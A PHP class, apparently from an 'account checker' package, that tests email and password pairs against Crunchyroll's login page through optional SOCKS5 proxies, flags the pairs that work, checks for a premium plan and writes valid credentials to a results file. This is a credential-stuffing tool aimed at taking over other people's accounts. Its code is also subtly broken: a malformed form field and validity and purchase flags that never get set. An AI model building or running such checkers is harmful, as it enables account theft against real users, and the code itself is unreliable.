<?php

namespace Markoftw\AccountChecker;

use Markoftw\AccountChecker\Webrequests\Webrequests as Webrequests;
use Markoftw\AccountChecker\Functions\Functions as Functions;

class Crunchyroll extends Webrequests
{
    private $_LOGIN_URL = "https://www.crunchyroll.com/login";
    private $_LOGOUT_URL = "http://www.crunchyroll.com/logout";
    private $_PROFILE_URL = "http://www.crunchyroll.com/orderstatus";
    private $_TRIAL_URL = "https://www.crunchyroll.com/freetrial/billing";

    private $_PROXY,
        $_TYPE,
        $_EMAIL,
        $_PASSWORD,
        $_FILE,
        $_VALID,
        $_PLAN,
        $_TIMER,
        $_PURCHASED,
        $_RESULTS;

    private static $_INSTANCE;
    private static $_SERVICE = "crunchyroll";

    public function __construct()
    {
        self::$_INSTANCE = new Webrequests();
        $this->_VALID = "FALSE";
        $this->_RESULTS = [];
        $this->_TIMER = Functions::timer();
    }

    /**
     * Set curl proxy.
     *
     * @param $proxy
     * @param string $type
     * @return $this
     */
    public function proxy($proxy, $type = "SOCKS5")
    {
        $this->_PROXY = $proxy;
        $this->_TYPE = $type;
        $this->_RESULTS['PROXY'] = $proxy;
        $this->_RESULTS['TYPE'] = $type;
        return $this;
    }

    /**
     * Checking the provided account.
     *
     * @param $email
     * @param $password
     * @return $this
     */
    public function check($email, $password)
    {
        $this->_EMAIL = $email;
        $this->_PASSWORD = $password;
        $this->_RESULTS['EMAIL'] = $email;
        $this->_RESULTS['PASSWORD'] = $password;

        if (!empty($this->_PROXY)) {
            $use_proxy = true;
            $proxy = array($ip = $this->_PROXY, $type = $this->_TYPE);
        } else {
            $use_proxy = false;
            $proxy = array("", "");
        }

        self::$_INSTANCE->request(self::$_SERVICE, $this->_LOGOUT_URL, $use_proxy, $proxy);

        $post_data = "formname=RpcApiUser_Login&fail_url=http://www.crunchyroll.com/login&name" . $email . "&password=" . $password;

        $post_body = self::$_INSTANCE->request(self::$_SERVICE, $this->_LOGIN_URL, $use_proxy, $proxy, true, $post_data);

        var_dump($post_body);

        if (!strpos($post_body, "Sign Up for a Free Account")) {
            $this->_RESULTS['VALID'] = "TRUE";
        } else {
            $this->_RESULTS['VALID'] = $this->_VALID;
        }

        $this->_TIMER = round((Functions::timer() - $this->_TIMER), 4);
        $this->_RESULTS['LOADTIME'] = $this->_TIMER;

        return $this;
    }

    /**
     * Check and get membership plan for the account.
     *
     * @return $this
     */
    public function plan()
    {
        if (!empty($this->_PROXY)) {
            $use_proxy = true;
            $proxy = array($ip = $this->_PROXY, $type = $this->_TYPE);
        } else {
            $use_proxy = false;
            $proxy = array("", "");
        }

        if($this->_PURCHASED == "TRUE")
        {
            $profile_body = self::$_INSTANCE->request(self::$_SERVICE, $this->_PROFILE_URL, $use_proxy, $proxy);

            preg_match('/Your order ([^"]*) is empty./', $profile_body, $match);

            if (!empty($match) && $match[1] == "history") {
                $str = "PREMIUM";
            } else {
                $str = "";
            }
            $this->_PLAN = $str;
            $this->_RESULTS['PLAN'] = $this->_PLAN;
        }

        return $this;
    }

    /**
     * Saving results to file.
     *
     * @param string $file
     * @return $this
     */
    public function save($file = "results_crunchyroll.txt")
    {
        if (!file_exists($file) || !is_writable($file)) {
            echo '<br/>' . $file . ' missing or not writable.<br/>';
            exit;
        }
        $this->_FILE = $file;
        $this->_RESULTS['COMPLETED'] = $this->_FILE;

        if ($this->_VALID != "FALSE") {
            $write_file = fopen($this->_FILE, "w") or die("Unable to open file!");
            $txt = "CRUNCHYROLL:" . $this->_EMAIL . ":" . $this->_PASSWORD . ":" . $this->_VALID . "\n";
            fwrite($write_file, $txt);
            fclose($write_file);
        }

        return $this;
    }

    /**
     * Return array.
     *
     * @return mixed
     */
    public function get()
    {
        return Functions::cleanKeys($this->_RESULTS);
    }

    /**
     * Return JSON.
     *
     * @return string
     */
    public function json()
    {
        return Functions::toJson(Functions::cleanKeys($this->_RESULTS));
    }

}
